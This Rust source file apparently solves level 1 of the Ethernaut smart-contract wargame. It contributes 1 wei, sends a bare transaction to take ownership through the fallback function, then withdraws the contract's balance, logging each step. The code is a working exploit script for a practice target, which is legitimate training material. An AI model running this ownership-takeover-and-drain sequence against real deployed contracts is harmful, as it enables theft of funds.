#[allow(unused_imports)]
use alloy::{
    network::TransactionBuilder,
    primitives::{
        address,
        utils::{format_ether, Unit},
        U256,
    },
    providers::{Provider, ProviderBuilder},
    rpc::types::TransactionRequest,
    signers::local::PrivateKeySigner,
    sol,
};

sol! {
    
    #[sol(rpc)]
    
    contract Fallback {
        function owner() external view returns (address);
        function contribute() public payable;
        function getContribution() public view returns (uint256);
        function withdraw() public;
    }
}

use crate::ethernaut;
use crate::utils;

use tokio::runtime::Runtime;

pub async fn example() -> Result<(), Box<dyn std::error::Error>> {
    let rpc_url = ethernaut::RPC;
    let provider = ProviderBuilder::new().connect(rpc_url).await?;
    
    let latest_block = provider.get_block_number().await?;
    println!("Latest block number: {latest_block}");
    
    let chain_id = provider.get_chain_id().await?;
    println!("Chain ID: {chain_id}");
    
    
    Ok(())
}



#[allow(dead_code)]
fn test() -> Result<(), Box<dyn std::error::Error>> {
    let rt = Runtime::new()?;
    rt.block_on(ethernaut::level_01::example())?;
    
    Ok(())
}

#[allow(dead_code)]
pub fn level1_runner() -> Result<(), Box<dyn std::error::Error>> {
    let rt = Runtime::new()?;
    rt.block_on(level1())?;
    
    Ok(())
}

#[allow(dead_code)]
async fn level1() -> Result<(), Box<dyn std::error::Error>> {
    let signer: PrivateKeySigner = ethernaut::ALICE_KEY.parse()?;
    
    let provider = ProviderBuilder::new()
        .wallet(signer)
        .connect(ethernaut::RPC)
        .await?;
    
    let fallback_address = address!("0x69a1407092D2FaBa43d08E692D2B1CA101d15E96");
    let fallback = Fallback::new(fallback_address, provider.clone());
    
    // check
    println!("Check-1");
    let balance = utils::balance("0x69a1407092D2FaBa43d08E692D2B1CA101d15E96".parse()?).await?;
    println!("[DEBUG]    {}'s balance = {}", "0x69a1407092D2FaBa43d08E692D2B1CA101d15E96", balance);
    let owner = fallback.owner().call().await?;
    println!("fallback's owner = {}", owner);
    
    // Fallback.contribute()
    let contribute_tx = fallback
        .contribute()
        .value(U256::from(1u64))
        .send()
        .await?;
    println!("(fallback.contribute()) Panding transaction... {}", contribute_tx.tx_hash());
    let contribute_receipt = contribute_tx
        .get_receipt()
        .await?;
    println!(
        "contribute included in block {}",
        contribute_receipt.block_number.expect("Failed to get block number")
    );
    
    // check
    let balance = utils::balance("0x69a1407092D2FaBa43d08E692D2B1CA101d15E96".parse()?).await?;
    println!("[DEBUG]    {}'s balance = {}", "0x69a1407092D2FaBa43d08E692D2B1CA101d15E96", balance);
    let owner = fallback.owner().call().await?;
    println!("fallback's owner = {}", owner);
    
    // Fallback.receive()
    println!("Sending Tx with 1 wei to Target");
    let value = U256::from(1u64);
    let tx = TransactionRequest::default()
        .with_to(fallback_address)
        .with_value(value);
    
    let pending_tx = provider.send_transaction(tx).await?;
    println!("Pending transaction... {}", pending_tx.tx_hash());
    let receipt = pending_tx.get_receipt().await?;
    println!("Transaction included in block {}", receipt.block_number.expect("Failed to get block number"));
    
    // check
    let balance = utils::balance("0x69a1407092D2FaBa43d08E692D2B1CA101d15E96".parse()?).await?;
    println!("[DEBUG]    {}'s balance = {}", "0x69a1407092D2FaBa43d08E692D2B1CA101d15E96", balance);
    let owner = fallback.owner().call().await?;
    println!("fallback's owner = {}", owner);
    
    // Fallback.withdraw()
    let withdraw_tx = fallback.withdraw().send().await?;
    println!("(fallback.withdraw()) Panding transaction... {}", withdraw_tx.tx_hash());
    let withdraw_receipt = withdraw_tx.get_receipt().await?;
    println!("Width included in block {}", withdraw_receipt.block_number.expect("Failed to get block number"));
    
    // check
    let balance = utils::balance("0x69a1407092D2FaBa43d08E692D2B1CA101d15E96".parse()?).await?;
    println!("[DEBUG]    {}'s balance = {}", "0x69a1407092D2FaBa43d08E692D2B1CA101d15E96", balance);
    let owner = fallback.owner().call().await?;
    println!("fallback's owner = {}", owner);   
    
    Ok(())
}